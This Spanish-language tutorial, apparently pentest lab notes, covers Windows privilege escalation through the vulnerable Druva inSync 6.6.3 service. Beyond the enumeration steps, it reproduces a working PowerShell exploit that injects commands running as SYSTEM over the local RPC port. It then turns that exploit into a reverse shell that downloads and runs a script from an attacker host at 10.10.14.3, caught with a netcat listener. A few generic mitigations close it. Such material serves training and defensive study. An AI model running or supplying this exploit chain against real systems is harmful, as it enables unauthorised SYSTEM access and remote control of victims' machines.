# Escalada de Privilegios en Windows - Servicios Vulnerables

## Introducción

En sistemas bien parcheados y configurados, aún es posible escalar privilegios si los usuarios pueden instalar software o si existen aplicaciones/servicios de terceros vulnerables en la organización. Es común encontrar diversos servicios y aplicaciones en estaciones de trabajo Windows durante evaluaciones de seguridad. Algunos permiten escalar a SYSTEM, otros pueden causar denegaciones de servicio o exponer datos sensibles.

---

## Enumeración de Programas Instalados

Para identificar software potencialmente vulnerable:

```cmd
wmic product get name
```

**Ejemplo de salida:**
```
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
Druva inSync 6.6.3
VMware Tools
Microsoft Update Health Tools
```

El software **Druva inSync 6.6.3** es vulnerable a inyección de comandos mediante un servicio RPC en el puerto 6064, ejecutándose como `NT AUTHORITY\SYSTEM`.

---

## Enumeración de Puertos Locales

Confirmar si el servicio está escuchando en el puerto 6064:

```cmd
netstat -ano | findstr 6064
```

**Ejemplo de salida:**
```
TCP    127.0.0.1:6064   0.0.0.0:0   LISTENING   3324
```

---

## Identificar el Proceso

Relacionar el PID 3324 con el proceso activo:

```powershell
get-process -Id 3324
```

**Salida esperada:**
```
ProcessName: inSyncCPHwnet64
```

---

## Confirmar el Servicio

Verificar que el servicio de Druva inSync esté activo:

```powershell
get-service | ? {$_.DisplayName -like 'Druva*'}
```

**Salida:**
```
Running  inSyncCPHService   Druva inSync Client Service
```

---

## Explotación del Servicio Vulnerable

### PoC en PowerShell

[PoC - Druva inSync Windows Client 6.6.3 - Local Privilege Escalation (PowerShell)](https://www.exploit-db.com/exploits/49211)

```]

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

---

### Modificación para Reverse Shell

1. Crear un **script de reverse shell** en PowerShell:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

2. Hospedar el script:

```bash
python3 -m http.server 8080
```

3. Modificar el PoC para ejecutar el script remoto:

```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

Ese script **shell.ps1**, es una reverse shell en powershell descargada de [aquí](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
La descargamos en máquina atacante, y al final del script añadimos la llamada a la función:

````shell-session
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
````

4. Configurar un **listener** en Netcat:

```bash
nc -lvnp 9443
```

5. Ejecutar el PoC en la máquina víctima. Si todo funciona, obtendrás una shell con privilegios **SYSTEM**:

```powershell
whoami
# nt authority\system
```

---

## Mitigaciones

- Restringir permisos de instalación de software en usuarios finales.
- Implementar **principio de privilegios mínimos**.
- Usar **whitelisting** para aplicaciones autorizadas.

---
